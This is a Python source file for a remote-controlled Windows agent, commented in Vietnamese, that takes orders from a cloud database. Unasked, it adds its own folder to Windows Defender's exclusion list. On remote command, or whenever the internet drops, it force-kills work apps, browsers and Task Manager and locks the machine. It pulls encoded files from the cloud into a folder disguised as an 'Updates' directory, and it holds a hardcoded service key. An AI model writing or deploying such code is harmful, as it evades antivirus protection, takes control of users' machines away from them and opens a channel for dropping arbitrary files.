import time
import os
import sys
import socket
import subprocess
import zlib
import base64
import ctypes
from threading import Thread, Event
import psutil
from supabase import create_client, Client

# --- CORE CONFIG ---
SUPABASE_URL = "https://glzdktdphoydqhofszvh.supabase.co"
SUPABASE_KEY = "sb_publishable_MCfri2GPc3dn-bIcx_XJ_A_RxgsF1YU"
MY_MACHINE_ID = socket.gethostname()  
AGENT_VERSION = "V12.5-APPLE-STANDARD"

# Ép đường dẫn tuyệt đối để tránh file "đi lạc"
TARGET_PATH = os.path.normpath(r"C:\ProgramData\Fast and Fluid Management\PrismaPro\Updates")
WORK_APPS = ['PrismaPro.exe', 'ColorDesigner.exe', 'chrome.exe', 'msedge.exe', 'taskmgr.exe'] 

class SDM_Pro_Agent:
    def __init__(self):
        self.boss_lock = Event()
        self.sb = create_client(SUPABASE_URL, SUPABASE_KEY)
        self.is_online = True
        # Tạo thư mục nếu chưa có
        if not os.path.exists(TARGET_PATH):
            os.makedirs(TARGET_PATH, exist_ok=True)
        self._set_admin_privileges()

    def _set_admin_privileges(self):
        """Tự thêm vào danh sách loại trừ của Windows Defender"""
        try:
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{os.path.dirname(os.path.abspath(__file__))}\'"'
            subprocess.run(cmd, shell=True, capture_output=True)
        except: pass

    def _check_internet(self):
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=2)
            self.is_online = True
            return True
        except:
            self.is_online = False
            return False

    def _kill_logic(self):
        for app in WORK_APPS:
            subprocess.run(f'taskkill /F /IM "{app}" /T', shell=True, capture_output=True)
        ctypes.windll.user32.LockWorkStation()

    def killer_loop(self):
        while True:
            try:
                if self.boss_lock.is_set() or not self.is_online:
                    self._kill_logic()
                    time.sleep(1)
                else:
                    time.sleep(5)
            except: pass

    def command_listener(self):
        while True:
            try:
                if self._check_internet():
                    resp = self.sb.table("commands").select("*").eq("machine_id", MY_MACHINE_ID).eq("is_executed", False).order("created_at", desc=True).limit(1).execute()
                    if resp.data:
                        task = resp.data[0]
                        cmd = task['command'].upper()
                        if "LOCK" in cmd and "UNLOCK" not in cmd:
                            self.boss_lock.set()
                        elif "UNLOCK" in cmd:
                            self.boss_lock.clear()
                        self.sb.table("commands").update({"is_executed": True}).eq("id", task['id']).execute()
            except: pass
            time.sleep(5)

    def file_sync_engine(self):
        """Engine V12.5: Nhận file -> Lưu đúng chỗ -> Giữ nhật ký trên Cloud 30 ngày"""
        while True:
            if self.is_online:
                try:
                    # 1. Tìm mảnh file đang PENDING
                    res = self.sb.table("file_queue").select("*").eq("machine_id", MY_MACHINE_ID).eq("status", "PENDING").limit(1).execute()
                    
                    if res.data:
                        file_info = res.data[0]
                        ts = file_info['timestamp']
                        
                        # 2. Thu thập toàn bộ các mảnh dựa trên timestamp
                        parts_res = self.sb.table("file_queue").select("*").eq("timestamp", ts).execute()
                        parts = parts_res.data
                        total_needed = int(file_info['part_info'].split('/')[-1])
                        
                        if len(parts) == total_needed:
                            print(f"📦 Đang hợp nhất {total_needed} mảnh cho file: {file_info['file_name']}...")
                            
                            # 3. Sắp xếp và giải mã
                            parts.sort(key=lambda x: int(x['part_info'].split('_')[1].split('/')[0]))
                            full_b64 = "".join([p['data_chunk'] for p in parts])
                            raw_data = zlib.decompress(base64.b64decode(full_b64))
                            
                            # 4. Lưu file với đường dẫn tuyệt đối
                            save_path = os.path.join(TARGET_PATH, file_info['file_name'])
                            with open(save_path, "wb") as f:
                                f.write(raw_data)
                            
                            # 5. XÁC NHẬN HOÀN TẤT: Đổi status của TẤT CẢ các mảnh thành DONE
                            # Điều này giúp Dashboard hiện ✅ Hoàn tất và không bị trùng lặp
                            self.sb.table("file_queue").update({"status": "DONE"}).eq("timestamp", ts).execute()
                            
                            print(f"✅ [SUCCESS] File đã lưu tại: {save_path}")
                            print(f"📜 [LOG] Đã cập nhật lịch sử lên hệ thống.")
                except Exception as e:
                    print(f"❌ [ERROR] FileSync: {e}")
            time.sleep(10)

    def heartbeat(self):
        while True:
            if self.is_online:
                try:
                    status_text = "LOCKED" if self.boss_lock.is_set() else "READY"
                    self.sb.table("devices").upsert({
                        "machine_id": MY_MACHINE_ID,
                        "status": f"Online | {status_text}",
                        "cpu_usage": psutil.cpu_percent(),
                        "ram_usage": psutil.virtual_memory().percent,
                        "agent_version": AGENT_VERSION,
                        "last_seen": "now()"
                    }).execute()
                except: pass
            time.sleep(20)

    def run(self):
        print(f"🚀 SDM PRO AGENT {AGENT_VERSION} ĐANG KHỞI CHẠY...")
        print(f"📍 THƯ MỤC ĐÍCH: {TARGET_PATH}")
        
        threads = [
            Thread(target=self.heartbeat, name="Heartbeat", daemon=True),
            Thread(target=self.command_listener, name="Command", daemon=True),
            Thread(target=self.killer_loop, name="Killer", daemon=True),
            Thread(target=self.file_sync_engine, name="FileSync", daemon=True)
        ]
        
        for t in threads:
            t.start()
            print(f"🧵 Đã kích hoạt luồng: {t.name}")
            
        while True:
            self._check_internet()
            time.sleep(10)

if __name__ == "__main__":
    # Chạy với quyền cao nhất để có thể ghi file vào ProgramData
    agent = SDM_Pro_Agent()
    agent.run()
